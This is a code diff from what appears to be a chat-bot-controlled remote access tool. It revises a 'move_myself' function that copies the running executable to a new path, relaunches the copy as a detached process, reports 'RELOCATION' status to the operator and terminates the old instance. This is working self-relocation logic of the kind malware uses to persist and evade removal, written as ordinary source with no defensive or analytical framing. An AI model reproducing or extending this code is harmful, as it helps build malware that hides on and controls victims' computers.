@@ -1612,48 +1612,56 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.mixer_menu_keyboard = self.new_menu(buttons, close_btn_lab="MXR_close")
 
     def move_myself(self, target_path: str) -> None:
+        """Move (copy + relaunch + close old) the executable."""
         self.bsendWithHtml(
             "<b>📦 RELOCATION</b>\n"
             "<pre>"
-            "Status  : Initializing\n"
-            f"Target  : {target_path[-40:]}\n"
+            "Status : Initializing...\n"
+            f"Target : {target_path[-50:]}\n"
             "</pre>"
         )
 
         if copy_myself(target_path):
-            exe_path = BASE_EXE
-            args = sys.argv[:]
-
             self.bsendWithHtml(
                 "<b>📦 RELOCATION</b>\n"
                 "<pre>"
-                "Status  : Copy complete\n"
-                "Launch  : New instance\n"
-                "Action  : Switching\n"
+                "Status : Copy successful\n"
+                "Action : Launching new instance...\n"
                 "</pre>"
             )
 
             try:
                 sp.Popen(
-                    [target_path] + sys.argv[1:],
-                    cwd=os.path.dirname(target_path),
+                    [target_path],
                     creationflags=sp.DETACHED_PROCESS | sp.CREATE_NEW_PROCESS_GROUP,
                     close_fds=True
                 )
 
+                self.bsendWithHtml(
+                    "<b>✅ RELOCATION SUCCESS</b>\n"
+                    "<pre>"
+                    "Status : Switching to new instance\n"
+                    "Old instance will now close.\n"
+                    "</pre>"
+                )
+
+                # Small delay then kill old process
+                time.sleep(1.2)
                 os._exit(0)
+
             except Exception as e:
                 self.bsendWithHtml(
                     "<b>❌ RELOCATION FAILED</b>\n"
                     "<pre>"
-                    f"Error   : {str(e)[:60]}\n"
+                    f"Error : {str(e)[:100]}\n"
                     "</pre>"
                 )
         else:
             self.bsendWithHtml(
                 "<b>❌ RELOCATION FAILED</b>\n"
                 "<pre>"
-                "Reason  : Copy failed\n"
+                "Reason : Failed to copy file\n"
+                "Check permissions or target path.\n"
                 "</pre>"
             )
 
